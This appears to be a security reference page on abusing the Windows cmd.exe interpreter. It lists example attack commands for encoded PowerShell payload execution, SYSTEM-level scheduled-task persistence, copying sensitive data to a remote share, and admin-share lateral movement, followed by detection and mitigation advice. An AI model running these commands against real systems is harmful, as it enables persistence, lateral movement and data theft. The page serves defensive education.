# cmd.exe
## What is it?
*```cmd.exe``` (Command Prompt) is a **built-in Windows command-line interpreter** that allows users to execute commands and run batch scripts.*
*It is used for file management, system configuration, network diagnostics, and many other administrative tasks. As a core component of the Windows operating system, it is widely trusted and often overlooked by security tools.*

## Legitimate Usage
- **System Management** → Execute administrative tasks such as file manipulation, system settings, and network configurations.
- **Script Execution** → Run batch files (.bat) or command scripts to automate routine tasks.
- **Network Diagnostics** → Use commands like ```ping```, ```ipconfig```, and ```netstat``` for troubleshooting network issues.
- **File Management** → Copy, move, delete, and manipulate files and directories.

## How to abuse it
- **Bypass Security Controls** → As a trusted utility, ```cmd.exe``` is often used by attackers to bypass security controls or execute malicious commands without triggering alerts.
- **Privilege Escalation** → Attackers can use ```cmd.exe``` to escalate privileges, modify user rights, or invoke other system tools to gain elevated access.
- **Persistence** → ```cmd.exe``` can be used to create scripts that persist across reboots or run at startup, maintaining access to compromised systems.
- **Data Exfiltration** → Attackers can use ```cmd.exe``` to move sensitive data off the system via file transfers, or by creating network shares for unauthorized data movement.
- **Command and Control (C2) Communication** → Attackers can use ```cmd.exe``` to interact with their C2 servers through network protocols, exfiltrating data or receiving commands.

## Example attacks
### 1. Running Malicious Commands
*Attackers can use ```cmd.exe``` to run malicious commands or execute scripts on the target system.*

**Execute Malicious Payload**

```
cmd.exe /c powershell -encodedcommand <encoded_payload>
```

**Effect:**
- Executes a PowerShell command or malicious payload silently, bypassing some detection systems.

### 2. Bypassing Security Controls with cmd.exe
*Since ```cmd.exe``` is trusted, attackers can use it to bypass security restrictions and launch other malicious tools or payloads.*

**Launch Malicious Executable from a Trusted Location**

```
cmd.exe /c C:\Windows\System32\trusted.exe
```

**Effect:**
- Executes a malicious program from a trusted location, avoiding detection by security tools.

### 3. Persistence via Scheduled Tasks
*Attackers can use ```cmd.exe``` to create scheduled tasks that persist even after system reboots.*

**Create a Scheduled Task to Run Malicious Command**

```
schtasks /create /tn "MaliciousTask" /tr "cmd.exe /c C:\malicious\payload.bat" /sc onlogon /ru SYSTEM
```

**Effect:**
- Runs a malicious command every time the user logs on, ensuring persistence across reboots.

### 4. Data Exfiltration via cmd.exe
*Attackers can use ```cmd.exe``` to exfiltrate data from the compromised system.*

**Move Sensitive Data to Remote Server**

```
cmd.exe /c copy C:\SensitiveData*.* \192.168.1.100\share
```

**Effect:**
- Copies sensitive data to a remote network share, exfiltrating it to the attacker's server.

### 5. Lateral Movement Using cmd.exe
*Attackers can use ```cmd.exe``` to interact with other systems on the network, exploiting the trust of the command line.*

**Use cmd.exe to Access Remote System via SMB**

```
cmd.exe /c net use \192.168.1.50\C$ /user:admin password
```

**Effect:**
- Connects to a remote system's admin share to move files or execute commands on the remote machine.

# Detection & Mitigation
## Detection Methods
**Monitor cmd.exe Execution**
- **Event ID 4688 (New Process Creation)** → Detect the execution of ```cmd.exe```, especially if it is invoked with unusual parameters or from suspicious locations.
- **Monitor for Unusual Commands** → Look for signs of suspicious commands or use of ```cmd.exe``` in combination with other tools to exploit system weaknesses.

**File Integrity Monitoring**
- **Check for Malicious Scripts** → Ensure that any scripts executed by ```cmd.exe``` are not unauthorized or malicious.

**Monitor Network Connections**
- **Event ID 5156 (Windows Filtering Platform)** → Look for suspicious outbound connections initiated via ```cmd.exe```, especially to external IPs or unknown C2 servers.

## Mitigation Strategies
- **Application Control** → Use application whitelisting or security policies to restrict the execution of ```cmd.exe``` and other command-line tools to trusted users.
- **User Privileges** → Limit the use of ```cmd.exe``` by non-administrative users to prevent unauthorized system modifications.
- **Monitor Scheduled Tasks** → Regularly audit scheduled tasks to detect unauthorized commands running on system startup or logon.
- **Use EDR Solutions** → Employ endpoint detection and response (EDR) tools that can detect suspicious command-line activity or tools used for lateral movement.
